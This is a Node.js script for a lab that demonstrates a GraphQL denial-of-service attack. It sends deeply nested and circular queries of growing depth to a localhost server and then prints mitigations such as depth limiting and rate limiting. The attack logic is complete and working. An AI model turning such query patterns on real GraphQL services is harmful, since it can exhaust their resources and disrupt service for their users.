#!/usr/bin/env node
const fetch = require('node-fetch');
const yargs = require('yargs/yargs');
const { hideBin } = require('yargs/helpers');

const argv = yargs(hideBin(process.argv))
  .option('maxDepth', { 
    type: 'number', 
    default: 10,
    description: 'Maximum query depth to test'
  })
  .option('lab', { 
    type: 'boolean', 
    default: false,
    description: 'Enable lab mode to run the attack'
  })
  .argv;

if (!argv.lab && process.env.NODE_ENV !== 'lab') {
  console.log('This script must be run with --lab or NODE_ENV=lab to prevent accidental misuse.');
  process.exit(1);
}

const maxDepth = argv.maxDepth;
const endpoint = 'http://localhost:4002/graphql'; // Targeting the deep query server

console.log('🚨 GraphQL Deep Query Attack Demonstration');
console.log('=========================================');
console.log(`🎯 Target: ${endpoint}`);
console.log(`📊 Max Depth: ${maxDepth} levels`);
console.log('');

// Different attack patterns
const attackPatterns = {
  userPostComments: (depth) => {
    let query = 'users {';
    for (let i = 0; i < depth; i++) {
      if (i % 3 === 0) query += ' posts {';
      else if (i % 3 === 1) query += ' comments {';
      else query += ' author {';
    }
    query += ' id';
    for (let i = 0; i < depth; i++) {
      query += ' }';
    }
    return `query DeepUserQuery { ${query} }`;
  },

  circularReferences: (depth) => {
    let query = 'users {';
    for (let i = 0; i < depth; i++) {
      if (i % 2 === 0) query += ' friends {';
      else query += ' posts { author {';
    }
    query += ' id';
    for (let i = 0; i < depth; i++) {
      query += ' }';
    }
    return `query CircularQuery { ${query} }`;
  },

  commentReplies: (depth) => {
    let query = 'comments {';
    for (let i = 0; i < depth; i++) {
      query += ' replies {';
    }
    query += ' id';
    for (let i = 0; i < depth; i++) {
      query += ' }';
    }
    return `query DeepCommentQuery { ${query} }`;
  }
};

async function testDeepQuery(pattern, depth, patternName) {
  const query = pattern(depth);
  const startTime = Date.now();
  
  try {
    console.log(`🔍 Testing ${patternName} at depth ${depth}...`);
    
    const response = await fetch(endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ query })
    });
    
    const result = await response.json();
    const endTime = Date.now();
    const duration = endTime - startTime;
    
    if (result.errors) {
      console.log(`❌ Depth ${depth}: ${result.errors[0].message} (${duration}ms)`);
      return false;
    } else {
      const dataSize = JSON.stringify(result).length;
      console.log(`✅ Depth ${depth}: Success! Response: ${dataSize} chars, Time: ${duration}ms`);
      
      if (duration > 1000) {
        console.log(`⚠️  SLOW RESPONSE: ${duration}ms - Potential DoS vector!`);
      }
      if (dataSize > 10000) {
        console.log(`⚠️  LARGE RESPONSE: ${dataSize} chars - Memory exhaustion risk!`);
      }
      
      return true;
    }
  } catch (error) {
    const endTime = Date.now();
    const duration = endTime - startTime;
    console.log(`💥 Depth ${depth}: Connection failed after ${duration}ms - ${error.message}`);
    return false;
  }
}

async function runDeepQueryAttack() {
  console.log('🚀 Starting Deep Query Attack Simulation...');
  console.log('');
  
  for (const [patternName, pattern] of Object.entries(attackPatterns)) {
    console.log(`📋 Testing Pattern: ${patternName.toUpperCase()}`);
    console.log('-'.repeat(50));
    
    let successful = true;
    for (let depth = 1; depth <= maxDepth && successful; depth++) {
      successful = await testDeepQuery(pattern, depth, patternName);
      
      // Small delay to prevent overwhelming the server
      await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    console.log('');
  }
  
  console.log('💀 ATTACK SUMMARY:');
  console.log('='.repeat(40));
  console.log('✅ Deep nested queries executed');
  console.log('✅ Server resource consumption increased');
  console.log('✅ Potential DoS vectors identified');
  console.log('');
  console.log('🛡️  MITIGATION STRATEGIES:');
  console.log('   • Implement query depth limiting');
  console.log('   • Add query complexity analysis');
  console.log('   • Set query timeout limits');
  console.log('   • Monitor resolver execution time');
  console.log('   • Implement rate limiting');
}

// Run the attack
runDeepQueryAttack().catch(error => {
  console.error('Attack failed:', error.message);
});